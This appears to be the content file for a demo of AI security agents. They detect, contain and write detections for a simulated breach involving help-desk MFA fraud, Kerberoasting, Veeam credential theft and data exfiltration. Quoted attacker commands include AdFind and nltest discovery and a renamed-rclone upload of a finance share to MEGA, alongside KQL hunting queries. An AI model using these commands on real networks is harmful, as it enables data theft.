messages.text:
Incident 2026-017 is open, **severity 1**: data is leaving now, and the actor has gone for the backups, which usually comes just before ransomware.

Order of work:
1. Stop the upload
2. Cut every way in
3. Protect the backups
4. Keep the evidence

Nobody powers anything off. I am keeping the timeline.
MEGA is blocked at the firewall for every host, not just HF-FS02. The upload stopped at **43.7 GB**.
FIN-VDI-07 and HF-FS02 are isolated in Defender. I captured memory on both first, so we keep what was running.
d.price is suspended in Okta with every session and token revoked. svc_backup is disabled in AD and its password reset.

Spoke to Daniel's manager. Daniel is on paternity leave and never called the help desk; the caller had his staff number and his manager's name.

The finance share holds payroll for all 1,800 staff, so this is a personal data breach. Our 72 hours to tell the ICO run to **03:16 on Sunday**. I have opened a claim on the insurer's breach line; their incident response firm joins us at 08:00.

New MFA factor for **d.price** (Finance) at 01:58: Okta Verify on a phone we have never seen, then a Citrix sign-in from 203.0.113.48, a residential proxy in the Netherlands. Daniel signs in from Leeds.

The help desk reset his MFA yesterday at 16:52 (INC-48213). Medium for now while I check he asked for it.

His Citrix session on FIN-VDI-07 is doing discovery no one in Finance does:

```
nltest /domain_trusts
net group "Domain Admins" /domain
af.exe -f "objectcategory=computer" > c.txt
```

`af.exe` is AdFind with the name changed.
Identity and endpoint alerts on the same account, 25 minutes apart. Raised to **high** and paged the on-call.
Kerberoasting from FIN-VDI-07: 31 service tickets in 40 seconds, all RC4 (event 4769, type 0x17). One is **svc_backup**, whose password was last changed in 2019.

svc_backup has just signed in to HF-FS02 and HF-VBR01, the Veeam server, from FIN-VDI-07. On HF-VBR01, PowerShell is reading the saved credentials out of the Veeam database. They are after the backups.

HF-FS02 has sent **41 GB** to `gfs262n.userstorage.mega.co.nz` since 02:44, from `C:\ProgramData\svchost.exe`. It is rclone renamed:

```
svchost.exe copy \\hf-fs02\finance mb:q4 --transfers 16 --max-age 2y --include "*.{xlsx,pdf,csv}"
```
Declaring an incident. Margot leads. Contain now; nothing in the runbook needs to wait for me.

group.name: Threat Research
group.description: Who is attacking companies like ours, and how we catch them

messages.text: Weekly brief: help-desk calls are still the most common way in against UK retail and logistics this year. A caller poses as staff, has MFA reset, adds a remote access tool, then goes for backups before encrypting.
Tonight follows that playbook step for step: help-desk reset, AdFind, Kerberoasting, then Veeam. Too early to name a group. Consistent with a ransomware affiliate, **low confidence**.
We have nothing that would catch renamed rclone. Writing a rule on its command line rather than its file name, since they always rename it.
The help desk MFA reset review is due Friday. Two resets last month were approved on a staff number alone.
Overnight: 412 alerts, 9 needed a look, none were real. Most of the noise was the new print server tripping the SMB rule.
14 accounts still sign in to Okta with SMS codes, all in the depots. I have asked their managers to move them to Okta Verify by the end of the month.
Defender is on 1,794 of 1,801 machines. The seven without it are warehouse scanners on Windows 10 IoT; I have put them in their own network segment.
Personal cloud storage is blocked for staff, but servers were never in that policy. I have drafted a rule to block it for servers too; it is waiting on the change board.
Restore test passed: HF-FS02 back from the hardened repository in 3 h 40 min, every file checked against its hash.
The cyber policy renews in December. The insurer wants proof of MFA on remote access and offline backups; we can show both.
Sent the help-desk brief to the service desk lead too. They are adding a call-back to the number on file before any MFA reset.
Retired 11 detections that fired over 200 times last month without a single true positive. Alert volume is down 30%.

intro.title: An active breach, contained
intro.subtitle: Detection, response and research agents working the same incident at 3 a.m.

type.text: Margot, where are we? Is the actor still in anywhere?

status.detail: Asking Rafe to hunt for other footholds

toolCall.title: Hunting across every device
toolCall.input:
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "AnyDesk.exe" and ProcessCommandLine has "--install"
| summarize First = min(Timestamp) by DeviceName, AccountName
toolCall.output:
DeviceName   AccountName  First
FIN-VDI-07   d.price      2026-10-15 02:31
HF-JMP02     svc_backup   2026-10-15 03:04

reply.text: Yes, one more. AnyDesk was installed on the jump host **HF-JMP02** at 03:04, seven minutes before svc_backup was disabled, and it is still connected out to an AnyDesk relay. Isolating it now.

toolCall.title: Checking the backups
toolCall.output:
Name             Type
HF-HARDENED-01   LinuxHardened
HF-NAS-01        Smb

reply.text:
The backups are safe. The nightly copies go to the hardened Linux repository, which keeps each one immutable for 14 days, and nothing was deleted.

The SMB copy on HF-NAS-01 is reachable with the credentials they read, so I have taken it offline and I am rotating every account in the Veeam store.

Where we are:

- **Contained**: the upload is stopped and all three hosts are isolated, with memory kept
- **Access cut**: d.price, svc_backup and the AnyDesk foothold
- **Backups**: intact and immutable
- **Not seen**: no DCSync and no new admins. If that changes, we reset krbtgt twice

Next: Ines reviews every help-desk MFA reset in the last 30 days, and Theo lists exactly which files left so Odile can scope the notice.

A second remote tool on a jump host, just before the account was cut, is the same playbook: they set up another way in once they think they have been seen. Worth hunting the last 90 days for any remote access tool we do not license.

toolCall.title: Testing against 90 days
toolCall.input:
DeviceProcessEvents
| where Timestamp > ago(90d)
| where ProcessCommandLine has_any (" copy ", " sync ") and ProcessCommandLine has_any ("--transfers", "--multi-thread-streams", "--max-age")
| where FileName !~ "rclone.exe"
| project Timestamp, DeviceName, FileName
toolCall.output:
Timestamp             DeviceName  FileName
2026-10-15 02:44:09   HF-FS02     svchost.exe
1 result in 90 days

reply.text: The renamed rclone rule is live in Defender and Sentinel as a high-severity alert. Over 90 days it finds tonight and nothing else, so it will not be noisy.
